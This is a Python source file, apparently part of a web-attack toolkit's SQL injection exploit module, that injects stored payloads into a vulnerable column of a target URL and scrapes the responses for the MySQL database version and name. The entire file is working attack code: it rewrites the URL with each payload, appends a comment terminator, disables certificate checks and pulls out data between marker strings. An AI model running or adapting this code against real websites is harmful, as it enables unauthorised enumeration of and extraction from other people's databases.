try:
    import requests
    import json
    import re
    from time import sleep

    from Config.WebConfig import define_headerdata
except Exception as error:
    raise SystemExit, "we have problem with importing the libraries: %s" % error


class GetDataBaseInfos:
    def __init__(self, url=None, vulnerableColumns=None):
        self.url = url
        self.vulnerableColumns = vulnerableColumns[0]

    def get_db_version(self):
        with open('./WebAttack/sqlinjection/modules/exploit/classicmethods/mysql/staticpaloads/getDatabaseInfo.json') \
                as file:

            data_extracted = list()

            payloads = json.load(file)

            for item in payloads['payloads']['version']:
                response = requests.get(url=self.url.replace(self.vulnerableColumns, item) + " %23",
                                        headers=define_headerdata, verify=False
                                        )

                if response.content.find("'2134115356'") is not -1:
                    end = re.search("'2134115356'", response.content).end()
                    start = re.search("'62134115356'", response.content).start()
                    data_extracted.append(response.content[end:start])
                    break

                sleep(1)

            return data_extracted

    def get_db_name(self):
        with open('./WebAttack/sqlinjection/modules/exploit/classicmethods/mysql/staticpaloads/getDatabaseInfo.json') \
                as file:

            data_extracted = list()

            payloads = json.load(file)

            for item in payloads['payloads']['name']:
                response = requests.get(url=self.url.replace(self.vulnerableColumns, item) + " %23",
                                        headers=define_headerdata, verify=False
                                        )

                if response.content.find("'2134115356'") is not -1:
                    end = re.search("'2134115356'", response.content).end()
                    start = re.search("'62134115356'", response.content).start()
                    data_extracted.append(response.content[end:start])
                    break

                sleep(1)

            return data_extracted


def databaseInfo(url=None, vulnerableColumns=None):

    getDatabaseInfos = GetDataBaseInfos(url=url, vulnerableColumns=vulnerableColumns)

    dbInfo = dict()

    dbInfo['database-version'] = getDatabaseInfos.get_db_version()
    dbInfo['database-name'] = getDatabaseInfos.get_db_name()

    return dbInfo
